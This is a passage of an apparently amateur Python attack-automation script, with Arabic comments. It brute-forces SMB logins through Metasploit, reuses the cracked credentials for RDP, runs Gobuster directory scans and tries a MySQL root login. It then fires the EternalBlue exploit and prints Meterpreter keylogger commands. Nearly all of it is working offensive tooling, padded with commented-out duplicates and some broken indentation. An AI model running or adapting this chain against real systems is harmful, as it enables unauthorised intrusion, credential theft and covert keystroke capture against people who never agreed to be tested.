    pass_file = input(f"\033[93mEnter the full path to the passwords file [{default_pass_file}]: \033[0m").strip()

    # إذا لم يدخل المستخدم شيء، نستخدم المسارات الافتراضية
    if not user_file:
        user_file = default_user_file
    if not pass_file:
        pass_file = default_pass_file

    msf_script = f"""
setg LHOST {LHOST}
setg RHOSTS {TARGET_IP}
use auxiliary/scanner/smb/smb_login
set user_file {user_file}
set pass_file {pass_file}
set stop_on_success true
set verbose true
run
exit
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write(msf_script)
        script_path = f.name

    result = subprocess.run(
        ["msfconsole", "-q", "-r", script_path],
        capture_output=True,
        text=True
    )

    full_output = result.stdout + result.stderr
    FOUND_CREDS = None

    for line in full_output.splitlines():
        if "Success:" in line:
            FOUND_CREDS = line
            break

    if FOUND_CREDS:
        print("\033[92m[+] Successful credentials found!\033[0m")
        print(f"\033[94m[*] Raw Line:\033[0m {FOUND_CREDS}")

        match = re.search(r"Success:\s+'([^:]+):([^']+)'", FOUND_CREDS)
        if match:
            USERNAME = match.group(1).split("\\")[-1]
            PASSWORD = match.group(2)

            print(f"\033[93mUsername:\033[0m {USERNAME}")
            print(f"\033[93mPassword:\033[0m {PASSWORD}")
        else:
            print("\033[91m[-] No valid credentials found.\033[0m")

    if FOUND_CREDS and match:
     ok, reason = rdp_conditions_met()

    if ok:
        print("\033[92m[*] SMB brute-force succeeded. Credentials obtained.\033[0m")
        print("\033[92m[*] Attempting RDP login...\033[0m")

        choice = input(
            "\033[94m[?] Do you want to proceed with the RDP login attempt? "
            "(\033[92my\033[0m/\033[91mn\033[0m): "
        ).strip().lower()

        if choice == "y":
            print("\033[92m[*] Executing RDP command...\033[0m")
            os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
        else:
            print("\033[91m[!] RDP login attempt canceled by user.\033[0m")

    else:
        print(f"\033[94m[-] RDP skipped: {reason}\033[0m")

 else:
    # لا نجاح → لا RDP → لا رسالة نجاح
    print("\033[91m[-] SMB brute-force failed. No valid credentials found.\033[0m")






# ok, reason = rdp_conditions_met()

# import os

# print("\033[92m[*] We have successfully obtained the username and password.\033[0m")
# print("\033[92m[*] Now we will attempt RDP login using rdesktop.\033[0m")

# if ok:
#  choice = input("\033[94m[?] Do you want to proceed with the RDP login attempt?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()

#  if choice == "y":
#     print("\033[92m[*] Executing RDP command...\033[0m")
#     os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
#  else:
#     print("\033[91m[!] RDP login attempt canceled.\033[0m")
# else:
#     print(f"\033[94m[-] RDP skipped: {reason}\033[0m")













# import subprocess

# cyan = "\033[96m"
# green = "\033[92m"
# red = "\033[91m"
# reset = "\033[0m"

# print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
# choice = input("> ").strip().lower()

# if choice in ["yes", "y"]:
#     print("Running the command...")
    
 
#     command = [
#         "gobuster",
#         "dir",
#         "-u", f"http://{TARGET_IP}/",
#         "--wordlist", "/usr/share/wordlists/dirb/common.txt"
#     ]

#     try:
#         subprocess.run(command)
#     except FileNotFoundError:
#         print("The command could not be executed. Make sure Gobuster is installed.")
# else:
#     print("Operation cancelled.")







#HTTP/HTTPS
# def http_conditions_met(port):
#     if not is_port_open(port):
#         return False, f"Port {port} is not open"

#     if str(port) not in services:
#         return False, "HTTP service not detected"

#     if services[str(port)]["service"] not in ["http", "https"]:
#         return False, "Service is not HTTP"

#     return True, "HTTP conditions met"



# import subprocess

# cyan = "\033[96m"
# green = "\033[92m"
# red = "\033[91m"
# reset = "\033[0m"

# DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"

# print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
# choice = input("> ").strip().lower()

# if choice in ["yes", "y"]:

#     # Ask user for wordlist path
#     wordlist = input(
#         f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
#     ).strip()

#     # Use default if empty
#     if not wordlist:
#         wordlist = DEFAULT_WORDLIST

#     print("Running the command...")

#     command = [
#         "gobuster",
#         "dir",
#         "-u", f"http://{TARGET_IP}/",
#         "--wordlist", wordlist
#     ]

#     try:
#         subprocess.run(command)
#     except FileNotFoundError:
#         print(f"{red}The command could not be executed. Make sure Gobuster is installed.{reset}")
# else:
#     print("Operation cancelled.")




# ANSI color codes
DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
cyan  = "\033[96m"
green = "\033[92m"
red   = "\033[91m"
yellow = "\033[93m"
reset = "\033[0m"




def http_conditions_met():
    if "80" in services and services["80"]["service"] in ["http", "http-alt"]:
        return True, "http"
    if "443" in services and services["443"]["service"] in ["https", "ssl/http"]:
        return True, "https"
    return False, "No HTTP service detected"


ok, protocol = http_conditions_met()

if not ok:
    print(f"{cyan}[-] HTTP enumeration skipped: No HTTP service detected{reset}")
else:
    print(f"{cyan}[?] {protocol.upper()} service detected.{reset}")
    choice = input(
        f"{cyan}Do you want to run directory scanning? ({green}yes{reset}/{red}no{reset}): {reset}"
    ).strip().lower()

    if choice in ["yes", "y"]:

        wordlist = input(
            f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
        ).strip()

        if not wordlist:
            wordlist = DEFAULT_WORDLIST

        print(f"{green}[*] Starting directory scan using Gobuster...{reset}")

        command = [
            "gobuster",
            "dir",
            "-u", f"{protocol}://{TARGET_IP}/",
            "-w", wordlist,
            "-q"
        ]

        try:
            subprocess.run(command)
            print(f"{green}[+] Directory scan finished successfully.{reset}")
        except FileNotFoundError:
            print(f"{red}[-] Gobuster not found. Please install it first.{reset}")
    else:
        print(f"{cyan}[*] HTTP enumeration skipped by user.{reset}")















# can_run, reason = mysql_conditions_met()


# import subprocess

# def try_mysql_login():
#     answer = input("\033[93mWould you like to connecting to the database server bypass exploit?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()

#     if answer in ("y", "yes"):
#         print("Running MySQL connection command...")
#         subprocess.run([
#     "mysql",
#     "-u", "root",
#     "-p",
#     "-h", TARGET_IP,
#     "--skip-ssl"
#                        ])
#         # subprocess.run(
#         #     f"mysql -u root -p -h {TARGET_IP} --skip-ssl",
#         #     shell=True
#         # )
#     else:
#         print("Skipping database connection test.")
# try_mysql_login()









can_run = mysql_conditions_met()

import subprocess

def try_mysql_login():
    print("\033[92m[*] MySQL service detected.\033[0m")

    answer = input(
        "\033[93mWould you like to attempt MySQL connection using root user?\033[0m "
        "(\033[92my\033[0m/\033[91mn\033[0m): "
    ).strip().lower()

    if answer in ("y", "yes"):
        print("\033[92m[*] Running MySQL connection command...\033[0m")
        subprocess.run([
            "mysql",
            "-u", "root",
            "-p",
            "-h", TARGET_IP,
            "--skip-ssl"
        ])
    else:
        print("\033[94m[*] MySQL connection skipped by user.\033[0m")


# ===== Main Logic =====
if can_run:
    try_mysql_login()
else:
    print(f"\033[94m[-] MySQL skipped: \033[0m")

















can_run = smb_conditions_met()



# print(
#     "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
#     "\033[92mkeyscan_start\033[0m\n"
#     "\033[94mkeyscan_dump\033[0m\n"
#     "\033[91mkeyscan_stop\033[0m"
# )






import subprocess
import tempfile

if not can_run:
    print(f"\033[94m[-] SMB exploit skipped:\033[0m")
else:
    print(
    "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
    "\033[92mkeyscan_start\033[0m\n"
    "\033[94mkeyscan_dump\033[0m\n"
    "\033[91mkeyscan_stop\033[0m"
)
    choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()
    
    if choice == "yes":
        print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")

        msf_script = f"""
setg LHOST {LHOST}
setg RHOSTS {TARGET_IP}
use exploit/windows/smb/ms17_010_eternalblue

exploit
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
            f.write(msf_script)
            script_path = f.name

        subprocess.run(["msfconsole", "-q", "-r", script_path])

    else:
        print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")


























# import subprocess
# import tempfile



# choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()

# if choice == "yes":
#     print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")

   
#     msf_script = f"""
# setg LHOST {LHOST}
# setg RHOSTS {TARGET_IP}
# use exploit/windows/smb/ms17_010_eternalblue

# exploit
# """

#     with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
#         f.write(msf_script)
#         script_path = f.name

    
#     subprocess.run(["msfconsole", "-q", "-r", script_path])

# else:
#     print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")







